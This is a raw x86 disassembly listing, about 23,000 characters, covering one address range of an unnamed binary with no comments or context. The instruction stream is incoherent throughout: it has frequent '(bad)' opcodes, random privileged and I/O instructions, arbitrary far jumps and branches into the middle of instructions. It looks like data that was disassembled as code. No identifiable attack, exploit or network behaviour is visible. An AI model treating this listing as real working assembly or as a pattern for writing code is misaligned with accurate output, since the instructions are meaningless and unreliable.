  418091:	jg     0x41807d
  418093:	scas   eax,DWORD PTR es:[edi]
  418094:	dec    eax
  418095:	inc    edi
  418096:	cwde   
  418097:	pop    eax
  418098:	lods   al,BYTE PTR ds:[esi]
  418099:	jno    0x41802c
  41809b:	jae    0x41807c
  41809d:	pop    ss
  41809e:	pop    ds
  41809f:	or     esi,DWORD PTR [edx+0x4a]
  4180a2:	fstp   QWORD PTR [ecx]
  4180a4:	enter  0xc745,0xe0
  4180a8:	jae    0x418070
  4180aa:	je     0x4180cd
  4180ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180ad:	jo     0x4180bd
  4180af:	stos   DWORD PTR es:[edi],eax
  4180b0:	sbb    cl,dh
  4180b2:	cmp    al,0xd0
  4180b4:	ror    dh,0x20
  4180b7:	in     eax,0x8c
  4180b9:	xchg   ebp,eax
  4180ba:	dec    eax
  4180bb:	push   ebx
  4180bc:	jmp    eax
  4180be:	push   0xffffffda
  4180c0:	enter  0xdef,0x5c
  4180c4:	inc    edi
  4180c5:	lods   eax,DWORD PTR ds:[esi]
  4180c6:	mov    ebp,0xe9989682
  4180cb:	mov    dh,0xb7
  4180cd:	xlat   BYTE PTR ds:[ebx]
  4180ce:	ins    BYTE PTR es:[edi],dx
  4180cf:	pop    esp
  4180d0:	xchg   esp,eax
  4180d1:	js     0x418054
  4180d3:	fidiv  WORD PTR [ebx+0x43ef75ab]
  4180d9:	adc    edi,DWORD PTR [ebp+0x4e15d0dd]
  4180df:	pop    edi
  4180e0:	dec    esp
  4180e1:	pop    edi
  4180e2:	and    al,bh
  4180e4:	leave  
  4180e5:	mov    esi,0x8e95821c
  4180ea:	push   0x5
  4180ec:	pop    eax
  4180ed:	sub    BYTE PTR [eax+0x9],cl
  4180f0:	in     al,0xe8
  4180f2:	es inc ecx
  4180f4:	test   DWORD PTR [ecx+0xc],eax
  4180f7:	repnz std 
  4180f9:	jecxz  0x4180af
  4180fb:	sbb    al,0xa5
  4180fd:	cmp    al,0x96
  4180ff:	add    bh,al
  418101:	inc    esp
  418102:	ror    DWORD PTR [eax+0x36cbf92b],0x71
  418109:	mov    eax,0x6b7630db
  41810e:	or     edx,DWORD PTR [ecx]
  418110:	mov    bl,0x2
  418112:	push   0x23
  418114:	jmp    0x4180f2
  418116:	aad    0x4c
  418118:	mov    eax,0x4bfb4bde
  41811d:	push   ecx
  41811e:	mov    ds:0x909f8a17,eax
  418123:	sub    DWORD PTR [ebp-0x363bc463],eax
  418129:	mov    ah,0xeb
  41812b:	adc    edi,esp
  41812d:	nop    DWORD PTR [esi+edx*8-0x73a6f292]
  418135:	jmp    0x41813b
  418137:	enter  0xb541,0x9c
  41813b:	inc    cl
  41813d:	cdq    
  41813e:	cmp    al,0x50
  418140:	nop
  418141:	push   edx
  418142:	inc    esp
  418143:	push   es
  418144:	out    0xd0,eax
  418146:	add    BYTE PTR [esi-0x5391791d],cl
  41814c:	test   eax,0xed3bf8f1
  418151:	sub    eax,DWORD PTR [edx+0x3b4e247d]
  418157:	ret    0xfb46
  41815a:	add    al,0x83
  41815c:	push   ebp
  41815d:	icebp  
  41815e:	mov    BYTE PTR [esi],al
  418160:	mov    dl,0x94
  418162:	dec    eax
  418163:	jmp    0x4181dd
  418165:	retf   0xe468
  418168:	mov    esp,DWORD PTR [ecx+0x28ec84a5]
  41816e:	push   cs
  41816f:	ds dec eax
  418171:	not    DWORD PTR [ecx+0x77]
  418174:	mov    bh,0x6
  418176:	xor    al,0x3a
  418178:	xor    al,0xb3
  41817a:	push   es
  41817b:	(bad)  
  41817c:	adc    eax,0xd1949212
  418181:	mov    BYTE PTR [edx],dh
  418183:	push   0x5609421c
  418188:	sub    al,0xc8
  41818a:	rcl    dl,0x53
  41818d:	fldenv [eax+ebx*8-0x7c]
  418191:	xor    bh,BYTE PTR [eax+0x20]
  418194:	inc    eax
  418195:	pop    ebp
  418196:	jb     0x418166
  418198:	inc    edx
  418199:	mov    ch,0x86
  41819b:	mov    edi,0x47639cce
  4181a0:	nop
  4181a1:	and    ecx,DWORD PTR [esi+0x5c]
  4181a4:	xor    al,0x7f
  4181a6:	mov    al,ds:0xee8f41a9
  4181ab:	xlat   BYTE PTR ds:[ebx]
  4181ac:	retf   0x4f44
  4181af:	inc    eax
  4181b0:	(bad)  
  4181b1:	jno    0x4181a1
  4181b3:	setne  BYTE PTR [edi+0x57]
  4181b7:	mov    ebp,0xc279d6ef
  4181bc:	pop    ecx
  4181bd:	cmp    eax,0x8ea731fe
  4181c2:	xchg   esp,eax
  4181c3:	add    eax,0xc9fde1ff
  4181c8:	push   ds
  4181c9:	mov    ch,0xf2
  4181cb:	pusha  
  4181cc:	(bad)  
  4181cd:	jle    0x418246
  4181cf:	imul   ebp,DWORD PTR [esp+0x4cd19ec],0x3
  4181d7:	cld    
  4181d8:	das    
  4181d9:	mov    esi,0x74ae211d
  4181de:	jbe    0x418246
  4181e0:	mov    bh,0xa1
  4181e2:	mov    dl,0x3a
  4181e4:	das    
  4181e5:	nop
  4181e6:	xlat   BYTE PTR ds:[ebx]
  4181e7:	xrelease xchg DWORD PTR [esi+0x7bf00b2e],ebp
  4181ee:	jb     0x4181d3
  4181f0:	push   ebx
  4181f1:	pop    edx
  4181f2:	shr    DWORD PTR [edi+0x58938478],1
  4181f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181f9:	jge    0x418244
  4181fb:	pop    ds
  4181fc:	loope  0x4181cc
  4181fe:	jae    0x418191
  418200:	(bad)  
  418201:	shr    dh,1
  418203:	pop    esp
  418204:	add    BYTE PTR [esi-0xd4bdc1d],bl
  41820a:	inc    edx
  41820b:	inc    ecx
  41820c:	dec    eax
  41820d:	jmp    0x1f632c40
  418212:	in     eax,dx
  418213:	out    0xf5,eax
  418215:	mov    al,0x5
  418217:	nop
  418218:	mov    ecx,0xe498a91
  41821d:	and    al,0xfe
  41821f:	xchg   al,cl
  418221:	adc    esi,DWORD PTR [eax]
  418223:	cwde   
  418224:	xor    al,0xd
  418226:	shr    DWORD PTR ds:0x1d3c1c00,cl
  41822c:	hlt    
  41822d:	jg     0x418265
  41822f:	sbb    edx,edi
  418231:	push   0x5
  418233:	iret   
  418234:	(bad)  
  418235:	cs cmp al,0x55
  418238:	sub    al,0x76
  41823a:	not    BYTE PTR [edx-0x80]
  41823d:	and    eax,edi
  41823f:	jg     0x418288
  418241:	dec    ebp
  418242:	std    
  418243:	xchg   edi,eax
  418244:	int    0x8e
  418246:	mov    ah,0x37
  418248:	push   ds
  418249:	mov    ds:0xca7eb160,eax
  41824e:	jl     0x41821b
  418250:	stos   BYTE PTR es:[edi],al
  418251:	cmp    al,0x1d
  418253:	repnz or ah,ch
  418256:	pop    ebx
  418257:	js     0x418258
  418259:	mov    ecx,0x85a2107b
  41825e:	clc    
  41825f:	daa    
  418260:	adc    eax,0x63ccf87e
  418265:	and    eax,0xc7b41e30
  41826a:	add    al,0xfd
  41826c:	cmove  ebx,DWORD PTR [ecx]
  41826f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418271:	sbb    BYTE PTR [edx+0x7cb15a0b],dl
  418277:	clc    
  418278:	into   
  418279:	iret   
  41827a:	xor    ch,ah
  41827c:	dec    ebp
  41827d:	xchg   esp,eax
  41827e:	sub    BYTE PTR [edi-0x3dd7330b],0x6c
  418285:	fisttp DWORD PTR [eax-0xf692de6]
  41828b:	jge    0x418297
  41828d:	and    DWORD PTR ds:0x6adab20b,esp
  418293:	icebp  
  418294:	inc    esp
  418295:	mov    eax,ds:0x6e27f828
  41829a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41829b:	imul   esi,DWORD PTR [eax],0xffffff98
  41829e:	in     al,dx
  41829f:	sbb    al,0xd1
  4182a1:	cld    
  4182a2:	int3   
  4182a3:	and    eax,0x46070ccf
  4182a8:	pop    esi
  4182a9:	mov    fs,WORD PTR [edi-0x45]
  4182ac:	or     eax,0xcd602d70
  4182b1:	in     al,0xc4
  4182b3:	pop    ss
  4182b4:	out    0x5,eax
  4182b6:	inc    esp
  4182b7:	sbb    cl,BYTE PTR [edx]
  4182b9:	loopne 0x418273
  4182bb:	scas   eax,DWORD PTR es:[edi]
  4182bc:	lea    edx,[ebp-0x61dc2126]
  4182c2:	in     al,dx
  4182c3:	xlat   BYTE PTR ds:[ebx]
  4182c4:	add    edx,DWORD PTR ds:0x994bb233
  4182ca:	push   cs
  4182cb:	repnz mov WORD PTR [edx-0x1f],?
  4182cf:	fcmovu st,st(4)
  4182d1:	int    0xd2
  4182d3:	(bad)  
  4182d4:	outs   dx,DWORD PTR ds:[esi]
  4182d5:	fsub   st,st(6)
  4182d7:	shl    BYTE PTR [edi],0xa4
  4182da:	sbb    ch,BYTE PTR [ecx-0x11]
  4182dd:	in     eax,dx
  4182de:	std    
  4182df:	pop    edi
  4182e0:	outs   dx,DWORD PTR ds:[esi]
  4182e1:	(bad)  
  4182e2:	retf   0x5e2d
  4182e5:	add    al,0x1c
  4182e7:	sti    
  4182e8:	jmp    0x4182c6
  4182ea:	sbb    al,0x13
  4182ec:	mov    bl,0x33
  4182ee:	push   0xffffffcb
  4182f0:	or     al,0x7e
  4182f2:	mov    eax,ss
  4182f4:	(bad)  
  4182f5:	in     eax,dx
  4182f6:	mov    dh,al
  4182f8:	pop    ecx
  4182f9:	bound  esp,QWORD PTR [edx-0x7]
  4182fc:	lahf   
  4182fd:	sbb    eax,0xadfcc670
  418302:	adc    esi,ecx
  418304:	in     al,dx
  418305:	in     eax,0x24
  418307:	mov    BYTE PTR [ebx],bl
  418309:	fiadd  WORD PTR [ecx+ebp*2+0x48855c00]
  418310:	(bad)  
  418311:	mov    esp,ebp
  418313:	jecxz  0x418301
  418315:	scas   eax,DWORD PTR es:[edi]
  418316:	push   eax
  418317:	fdivr  DWORD PTR [eax]
  418319:	dec    edx
  41831a:	pop    ebx
  41831b:	pop    ebp
  41831c:	je     0x41832f
  41831e:	sub    esi,DWORD PTR [esp+ecx*4+0x2059ed66]
  418325:	(bad)  
  418326:	sbb    al,0x2c
  418328:	arpl   bx,dx
  41832a:	jbe    0x41831e
  41832c:	mov    bl,0x64
  41832e:	or     eax,0x488a703c
  418333:	xor    eax,0x20471045
  418338:	jno    0x41832f
  41833a:	push   cs
  41833b:	jmp    FWORD PTR [ebp+edx*1+0x4f]
  41833f:	cli    
  418340:	repnz mov edx,0xc9596e46
  418346:	mov    esi,0x6855384c
  41834b:	mov    BYTE PTR [ecx+0x62edf679],al
  418351:	in     eax,0xf5
  418353:	push   ds
  418354:	mov    ebx,DWORD PTR [esi+edx*4-0x51b7589f]
  41835b:	pop    ds
  41835c:	add    DWORD PTR [ebp+0x43],0xc0597a76
  418363:	push   edx
  418364:	jp     0x4183dc
  418366:	and    al,0xe5
  418368:	or     cl,ch
  41836a:	mov    bh,BYTE PTR [edx+ecx*8-0x6644d68d]
  418371:	jmp    0xf247:0x84da844a
  418378:	xor    eax,0x8a49875a
  41837d:	fwait
  41837e:	scas   eax,DWORD PTR es:[edi]
  41837f:	add    al,0xa9
  418381:	jne    0x41830d
  418383:	push   esi
  418384:	je     0x41831a
  418386:	xchg   edi,eax
  418387:	ins    BYTE PTR es:[edi],dx
  418388:	pop    ecx
  418389:	pop    ds
  41838a:	addr16 or cl,dl
  41838d:	jmp    0x4183f1
  41838f:	xor    al,0x9f
  418391:	aaa    
  418392:	push   esi
  418393:	rcl    eax,0x53
  418396:	xor    al,0x65
  418398:	add    ah,cl
  41839a:	mov    esp,0x684661a3
  41839f:	push   ebx
  4183a0:	sbb    ebp,ebx
  4183a2:	imul   esp,ebx,0xa5ac3bc0
  4183a8:	sub    eax,0x95fa0b26
  4183ad:	mov    ds:0x1cb62e11,eax
  4183b2:	push   esi
  4183b3:	and    al,0x7c
  4183b5:	mov    ch,0xab
  4183b7:	or     ebp,edx
  4183b9:	push   ds
  4183ba:	and    edi,esp
  4183bc:	pop    edi
  4183bd:	sbb    esi,edi
  4183bf:	xor    ah,BYTE PTR [edx+0x4a]
  4183c2:	add    edx,DWORD PTR [ecx-0x3b]
  4183c5:	adc    esp,DWORD PTR [ecx-0x3b]
  4183c8:	xor    ebp,DWORD PTR [esi+0x24]
  4183cb:	sti    
  4183cc:	lds    esi,FWORD PTR ds:0x87598b53
  4183d2:	je     0x4183c7
  4183d4:	and    al,0x64
  4183d6:	fst    QWORD PTR [ebx-0x10]
  4183d9:	inc    eax
  4183da:	fbld   TBYTE PTR [edx+0x12]
  4183dd:	mov    ecx,edi
  4183df:	lock (bad) 
  4183e1:	loope  0x4183c2
  4183e3:	int    0x7d
  4183e5:	and    eax,0xdae6de75
  4183ea:	mov    fs:0x75f93a37,al
  4183f0:	mov    WORD PTR [ebx],?
  4183f2:	inc    ecx
  4183f3:	dec    edx
  4183f4:	lods   al,BYTE PTR ds:[esi]
  4183f5:	and    BYTE PTR [ebx],ah
  4183f7:	sbb    DWORD PTR [ecx],eax
  4183f9:	pop    ecx
  4183fa:	dec    edx
  4183fb:	in     eax,dx
  4183fc:	arpl   WORD PTR gs:[esp+edi*2],di
  418400:	retf   
  418401:	xor    al,0x3d
  418403:	jo     0x4183a5
  418405:	adc    BYTE PTR [edi+0x6f0c80ac],0x14
  41840c:	std    
  41840d:	mov    ah,0x70
  41840f:	sub    al,0x58
  418411:	bound  ebx,QWORD PTR [esi+0x1415668c]
  418417:	adc    edx,DWORD PTR [esp+eax*8-0x3d1a493d]
  41841e:	mov    BYTE PTR [esi],ch
  418420:	adc    bh,bl
  418422:	loope  0x418414
  418424:	cmp    BYTE PTR [eax-0x8f22dba],bl
  41842a:	jns    0x41842f
  41842c:	(bad)  
  41842d:	or     DWORD PTR [ebx+0x565cd772],ecx
  418433:	retf   0xeca9
  418436:	xchg   edi,eax
  418437:	stc    
  418438:	(bad)  
  418439:	xchg   ebp,eax
  41843a:	push   eax
  41843b:	push   esp
  41843c:	push   ecx
  41843d:	(bad)  
  41843e:	in     al,dx
  41843f:	mov    bh,BYTE PTR [esi+eiz*1+0x6306be57]
  418446:	and    al,0xa0
  418448:	fld    DWORD PTR ds:0x321e736
  41844e:	inc    esi
  41844f:	or     eax,0xd47698eb
  418454:	in     al,dx
  418455:	jle    0x418445
  418457:	rep ins DWORD PTR es:[edi],dx
  418459:	sbb    al,0x79
  41845b:	daa    
  41845c:	rcl    dl,cl
  41845e:	std    
  41845f:	inc    esp
  418460:	dec    edx
  418461:	or     esp,DWORD PTR [eax]
  418463:	test   ebx,edx
  418465:	xchg   esi,eax
  418466:	psrlw  mm4,QWORD PTR [eax+0x1]
  41846a:	cmp    ah,BYTE PTR [esi+eiz*4+0x3f]
  41846e:	or     bl,BYTE PTR [edx+0x1324ab07]
  418474:	stos   DWORD PTR es:[edi],eax
  418475:	gs cwde 
  418477:	stos   DWORD PTR es:[edi],eax
  418478:	add    ah,dh
  41847a:	jmp    0x418478
  41847c:	inc    ecx
  41847d:	loop   0x4184ec
  41847f:	add    DWORD PTR [ebx+0x25],esp
  418482:	jae    0x41848d
  418484:	sbb    DWORD PTR [eax],ebx
  418486:	adc    dl,BYTE PTR [eax-0x73a4c1b4]
  41848c:	(bad)  
  41848d:	mov    al,0x6a
  41848f:	ins    DWORD PTR es:[edi],dx
  418490:	test   DWORD PTR [ecx+0x65],eax
  418493:	pusha  
  418494:	dec    ebp
  418495:	xchg   esi,eax
  418496:	mov    bh,0x85
  418498:	lahf   
  418499:	push   es
  41849a:	or     al,0xc1
  41849c:	sbb    al,0xea
  41849e:	jge    0x418510
  4184a0:	dec    ecx
  4184a1:	push   0xffffff81
  4184a3:	xchg   ebp,eax
  4184a4:	fmul   DWORD PTR [ecx-0x23]
  4184a7:	sub    eax,DWORD PTR [esi-0x21]
  4184aa:	xor    al,0x90
  4184ac:	inc    eax
  4184ad:	xchg   edx,eax
  4184ae:	scas   al,BYTE PTR es:[edi]
  4184af:	shr    DWORD PTR [edx],1
  4184b1:	repz (bad) [esp+ebp*4-0x531d2986]
  4184b9:	and    BYTE PTR [edx],ch
  4184bb:	mov    DWORD PTR [esi],ecx
  4184bd:	arpl   WORD PTR [eax+ebx*2+0x58d5afbb],sp
  4184c4:	dec    edx
  4184c5:	or     eax,0x482ac78
  4184ca:	test   al,0x20
  4184cc:	sbb    eax,0x5c10b68
  4184d1:	jne    0x41848c
  4184d3:	xchg   esp,eax
  4184d4:	pop    es
  4184d5:	repnz (bad) 
  4184d7:	in     eax,dx
  4184d8:	mov    BYTE PTR [ebx+0x7ff881af],ch
  4184de:	mov    gs,WORD PTR [ebx]
  4184e0:	jp     0x4184ec
  4184e2:	loopne 0x418483
  4184e4:	mov    bl,BYTE PTR [esi-0x51a20742]
  4184ea:	push   0xffffff93
  4184ec:	call   0x3a4f:0x672185f4
  4184f3:	mov    esp,0x711e1069
  4184f8:	push   ss
  4184f9:	aad    0x3b
  4184fb:	(bad)  
  4184fc:	pop    ebp
  4184fd:	in     eax,0x11
  4184ff:	push   ss
  418500:	shl    BYTE PTR [ebx+eax*2+0x44],1
  418504:	mov    ebx,0xd523a1e3
  418509:	ficomp WORD PTR [eax+0x21a54077]
  41850f:	jmp    0x42ef41f5
  418514:	pop    eax
  418515:	xor    ebp,DWORD PTR [ebx+0x2c553f0f]
  41851b:	pushf  
  41851c:	add    DWORD PTR [ecx-0x33],edx
  41851f:	sub    dl,BYTE PTR [ebx]
  418521:	cmp    DWORD PTR [edi+0x7f4f8848],esi
  418527:	test   al,0x98
  418529:	hlt    
  41852a:	cmp    BYTE PTR [ebx-0x36],0x41
  41852e:	jecxz  0x418569
  418530:	aad    0xd2
  418532:	jmp    DWORD PTR [esi-0x52]
  418535:	ins    DWORD PTR es:[edi],dx
  418536:	fwait
  418537:	dec    ecx
  418538:	(bad)  
  418539:	fsub   DWORD PTR ds:0xd417741e
  41853f:	cmp    eax,0xbf2a5ba8
  418544:	pop    ebx
  418545:	outs   dx,DWORD PTR ds:[esi]
  418546:	jmp    0x418562
  418548:	jb     0x4185ab
  41854a:	mov    DWORD PTR [eax+0x637481e1],edi
  418550:	pop    es
  418551:	adc    esi,ecx
  418553:	int3   
  418554:	mov    edx,0xeaa8c376
  418559:	sbb    al,0xbd
  41855b:	fld    st(3)
  41855d:	add    al,0x13
  41855f:	fcom   DWORD PTR [eax+0x29abcd80]
  418565:	loope  0x4184ed
  418567:	icebp  
  418568:	fist   WORD PTR ds:0xd888a0c8
  41856e:	push   ebp
  41856f:	out    dx,al
  418570:	fnstsw WORD PTR [eax+0x49]
  418573:	repz sub esi,DWORD PTR [esi+0x5f]
  418577:	sub    DWORD PTR [edi+0x1c98e5db],ebp
  41857d:	(bad)  [ecx+esi*2+0x22]
  418581:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418582:	ror    BYTE PTR [esp+ebx*1-0x6f],0xd8
  418587:	and    al,0x27
  418589:	arpl   WORD PTR [edx+0x69a7cf99],di
  41858f:	into   
  418590:	loopne 0x4185aa
  418592:	push   0x91c49efe
  418597:	add    ecx,DWORD PTR [esi-0x38]
  41859a:	xchg   esp,eax
  41859b:	aas    
  41859c:	sbb    BYTE PTR [eax-0x1],bh
  41859f:	lock jl 0x418578
  4185a2:	xchg   edi,eax
  4185a3:	xor    eax,0x6129481e
  4185a8:	(bad)  [edx+0x42]
  4185ab:	pop    ebx
  4185ac:	sub    ch,BYTE PTR [edi]
  4185ae:	mov    dl,0x26
  4185b0:	mov    esi,0xd41b9ac2
  4185b5:	and    DWORD PTR [esi],edi
  4185b7:	sbb    DWORD PTR [esi],ecx
  4185b9:	lahf   
  4185ba:	sub    ebx,DWORD PTR [ebx-0x7dc8e922]
  4185c0:	sti    
  4185c1:	ret    0x351f
  4185c4:	or     DWORD PTR [esi],eax
  4185c6:	add    ecx,DWORD PTR [eax+0x667eb3c0]
  4185cc:	push   ss
  4185cd:	mov    edi,DWORD PTR [esi+ebp*8-0x3a867a81]
  4185d4:	jmp    0x41857e
  4185d6:	xor    ecx,ecx
  4185d8:	xchg   DWORD PTR [ebx+0x748427f3],edi
  4185de:	rcl    BYTE PTR [ebp+0x4a],cl
  4185e1:	test   BYTE PTR [eax+0x56],ch
  4185e4:	shl    ah,1
  4185e6:	add    esi,ebx
  4185e8:	nop
  4185e9:	jl     0x41861a
  4185eb:	xor    BYTE PTR [ecx-0x16],dh
  4185ee:	pop    ss
  4185ef:	mov    ah,BYTE PTR [ebx]
  4185f1:	inc    ebx
  4185f2:	xor    eax,0x670a7707
  4185f7:	adc    BYTE PTR [ecx],bl
  4185f9:	es sbb eax,0xd05eb1d3
  4185ff:	int3   
  418600:	jle    0x41860f
  418602:	mov    ecx,0x311a06c1
  418607:	daa    
  418608:	out    dx,eax
  418609:	pop    es
  41860a:	jl     0x4185f2
  41860c:	repz jmp 0x4185d9
  41860f:	imul   edx,DWORD PTR [ebp+0x700ea8a5],0x1ada419
  418619:	cmp    eax,0x811f4e9c
  41861e:	out    dx,al
  41861f:	cs into 
  418621:	xchg   ebx,eax
  418622:	imul   ebx,DWORD PTR [esp+ebx*1-0x712ee1b8],0xd63b393c
  41862d:	jmp    0x9dc0:0x10f91ce0
  418634:	shr    ebx,cl
  418636:	jo     0x41863c
  418638:	repz dec eax
  41863a:	(bad)  
  41863b:	retf   
  41863c:	xor    eax,0xfd5bffa9
  418641:	pop    esp
  418642:	cmp    DWORD PTR [edx+ecx*1],0xffffffa3
  418646:	and    ebx,eax
  418648:	rcr    BYTE PTR [ecx],0xd0
  41864b:	popa   
  41864c:	retf   
  41864d:	mov    WORD PTR [eax+ebx*8-0x1873a9ec],gs
  418654:	pop    ss
  418655:	xor    dh,cl
  418657:	scas   eax,DWORD PTR es:[edi]
  418658:	shl    ebx,cl
  41865a:	jbe    0x418623
  41865c:	xor    esi,DWORD PTR [ebx+0x6acfb43f]
  418662:	and    eax,0xd6680c23
  418667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418668:	(bad)  
  418669:	dec    edi
  41866a:	out    dx,eax
  41866b:	cdq    
  41866c:	and    ecx,esi
  41866e:	test   DWORD PTR [ebp-0x1433ad39],esi
  418674:	adc    al,0xe0
  418676:	cmovbe ebx,DWORD PTR [esp+ecx*8+0x53ebb0a2]
  41867e:	es jns 0x41860c
  418681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418682:	xchg   DWORD PTR [ebx-0x4310419],edx
  418688:	xor    edx,ebx
  41868a:	or     bl,BYTE PTR [ebx+0xc]
  41868d:	test   DWORD PTR [esi],esi
  41868f:	cdq    
  418690:	mov    dl,0x13
  418692:	mov    esi,0x4c4999bc
  418697:	or     edi,DWORD PTR [edi+0x47]
  41869a:	mov    ecx,0xb7b10ac3
  41869f:	jg     0x4186ef
  4186a1:	push   eax
  4186a2:	retf   0xcceb
  4186a5:	lods   eax,DWORD PTR ds:[esi]
  4186a6:	aad    0xbd
  4186a8:	jge    0x4186b7
  4186aa:	stc    
  4186ab:	scas   eax,DWORD PTR es:[edi]
  4186ac:	xor    bl,BYTE PTR [esp+ebx*4]
  4186af:	sbb    al,0xc3
  4186b1:	push   ebp
  4186b2:	pop    eax
  4186b3:	pxor   mm1,QWORD PTR [eax+0x19]
  4186b7:	adc    esp,DWORD PTR [ebx+edx*8+0x36c76ea1]
  4186be:	jecxz  0x418684
  4186c0:	adc    bh,al
  4186c2:	pushw  es
  4186c4:	call   0xf95d:0xa9f6b3c6
  4186cb:	pop    edi
  4186cc:	imul   ebx,esi,0xc97ed702
  4186d2:	jecxz  0x41871c
  4186d4:	gs sub eax,ecx
  4186d7:	stc    
  4186d8:	sub    DWORD PTR [eax+0x3c],esp
  4186db:	cmp    bh,BYTE PTR [eax-0x5f]
  4186de:	sub    eax,0x18dc48bc
  4186e3:	jb     0x41867b
  4186e5:	cmp    eax,0x9495bed
  4186ea:	std    
  4186eb:	sbb    al,0x12
  4186ed:	leave  
  4186ee:	(bad)  
  4186ef:	and    eax,0xd59c2ae0
  4186f4:	rcl    DWORD PTR [esi+0x47d6987e],1
  4186fa:	sub    BYTE PTR [ebx+0x543d3fdd],bh
  418700:	and    BYTE PTR [ebx-0x17],al
  418703:	sbb    eax,DWORD PTR [ebp-0x61]
  418706:	rcl    BYTE PTR [edi-0x700ce376],cl
  41870c:	mov    esi,0x66521a2c
  418711:	enter  0xebe,0xf7
  418715:	test   al,0x3a
  418717:	dec    ecx
  418718:	xor    DWORD PTR [ebx+esi*1+0x59bdafff],edi
  41871f:	sub    esi,ebp
  418721:	mov    esp,0x109ee24a
  418726:	fst    DWORD PTR [eax]
  418728:	pop    esp
  418729:	adc    eax,0x17c07f8c
  41872e:	mov    ch,0xd7
  418730:	aam    0xfa
  418732:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418734:	nop
  418735:	and    eax,0x8b1d1f55
  41873a:	gs repnz add eax,0x21a1a7b4
  418741:	fucomip st,st(3)
  418743:	or     BYTE PTR [esi-0x64],bl
  418746:	cwde   
  418747:	enter  0x3c57,0xbf
  41874b:	hlt    
  41874c:	or     al,0x92
  41874e:	rep outs dx,DWORD PTR es:[esi]
  418751:	inc    edi
  418752:	and    esi,DWORD PTR [ebp+0x3e]
  418755:	mov    dl,0xf7
  418757:	xor    edi,DWORD PTR [ecx+0x4f36241]
  41875d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41875e:	push   ebp
  41875f:	arpl   WORD PTR [ebx+0xd2f8b55],bx
  418765:	or     DWORD PTR [ebx],ecx
  418767:	cld    
  418768:	leave  
  418769:	ins    DWORD PTR es:[edi],dx
  41876a:	fucomp st(7)
  41876c:	jge    0x4187a3
  41876e:	pop    edi
  41876f:	cs jge 0x4186fe
  418772:	push   esi
  418773:	adc    DWORD PTR [eax],0xffffffdd
  418776:	add    al,BYTE PTR [edi-0x56]
  418779:	push   esi
  41877a:	mov    edx,DWORD PTR [ecx]
  41877c:	and    al,0xbd
  41877e:	pop    esp
  41877f:	test   BYTE PTR ds:0x87eb313a,dh
  418785:	out    dx,al
  418786:	push   esp
  418787:	(bad)
  41878a:	and    DWORD PTR [ecx-0x6840352d],eax
  418790:	dec    BYTE PTR [ebx+edx*8-0x15]
  418794:	aad    0xb8
  418796:	pop    es
  418797:	sahf   
  418798:	jecxz  0x418768
  41879a:	inc    ebx
  41879b:	gs push ss
  41879d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41879e:	and    al,0xcc
  4187a0:	stc    
  4187a1:	bound  ebx,QWORD PTR ds:0x4c277df0
  4187a7:	nop
  4187a8:	jmp    0xd1abbf3a
  4187ad:	dec    ebp
  4187ae:	fsub   QWORD PTR [esi-0x11a60f1a]
  4187b4:	adc    DWORD PTR [ebx+0x3abd27ca],ecx
  4187ba:	mov    bh,0xa4
  4187bc:	inc    ebx
  4187bd:	gs sahf 
  4187bf:	xlat   BYTE PTR ds:[ebx]
  4187c0:	test   eax,0x13a28d16
  4187c5:	inc    eax
  4187c6:	arpl   WORD PTR [edi+0x1e019e0f],cx
  4187cc:	pop    ebx
  4187cd:	pop    edx
  4187ce:	inc    BYTE PTR ds:0x5d42cefd
  4187d5:	data16 clc 
  4187d7:	inc    ecx
  4187d8:	or     BYTE PTR [edx],al
  4187da:	aas    
  4187db:	scas   eax,DWORD PTR es:[edi]
  4187dc:	pop    edx
  4187dd:	xchg   ebp,eax
  4187de:	imul   DWORD PTR [ecx-0x367cf087]
  4187e4:	fucompp 
  4187e6:	xor    DWORD PTR [ebx-0x66],0x14
  4187ea:	xor    BYTE PTR ds:0x6e77e1d0,cl
  4187f0:	cmp    al,0x5f
  4187f2:	and    ebx,DWORD PTR [esi+eiz*1]
  4187f5:	add    cl,0x49
  4187f8:	inc    ebp
  4187f9:	repnz push ebx
  4187fb:	mov    esp,0xfbfa4f4d
  418800:	mov    al,ds:0x793c7ba0
  418805:	scas   eax,DWORD PTR es:[edi]
  418806:	jl     0x41883e
  418808:	add    BYTE PTR [eax-0x71840d0c],cl
  41880e:	add    dl,cl
  418810:	pushf  
  418811:	adc    ecx,DWORD PTR [ecx]
  418813:	rol    DWORD PTR [esi+0x514c44fc],0x53
  41881a:	mov    al,0x90
  41881c:	div    BYTE PTR [edi*1-0xc5bb4fe]
  418823:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418824:	sbb    DWORD PTR [ecx+esi*1+0x4e5c6f4f],esi
  41882b:	push   ebx
  41882c:	std    
  41882d:	and    BYTE PTR [edi-0x157ba18d],bh
  418833:	add    dh,al
  418835:	popa   
  418836:	loop   0x4187df
  418838:	repz xchg ecx,eax
  41883a:	scas   eax,DWORD PTR es:[edi]
  41883b:	mov    ah,0x7e
  41883d:	sub    ecx,DWORD PTR [edx+0x2165b232]
  418843:	repz sub bl,BYTE PTR [eax+0x44]
  418847:	xchg   edx,eax
  418848:	sbb    al,0x2c
  41884a:	add    DWORD PTR [edx-0x9fb60c4],ebp
  418850:	xor    ebp,eax
  418852:	int    0xaf
  418854:	cmp    DWORD PTR [ebx],edx
  418856:	xchg   esp,eax
  418857:	inc    esp
  418858:	xor    DWORD PTR [ebp-0x6e],eax
  41885b:	mov    edi,DWORD PTR [edi-0x21d22340]
  418861:	inc    edi
  418862:	pop    ecx
  418863:	or     DWORD PTR [eax],edi
  418865:	dec    edx
  418866:	mov    ah,al
  418868:	sahf   
  418869:	sbb    edi,edx
  41886b:	sbb    bl,BYTE PTR [ebx-0x19]
  41886e:	dec    edx
  41886f:	loope  0x418838
  418871:	clc    
  418872:	add    esi,DWORD PTR [esi+0x34a6704a]
  418878:	bnd jbe 0x4188ca
  41887b:	xor    eax,0x3c94930e
  418880:	xchg   ecx,eax
  418881:	adc    eax,0xd6c22b9a
  418886:	retf   0xf9c3
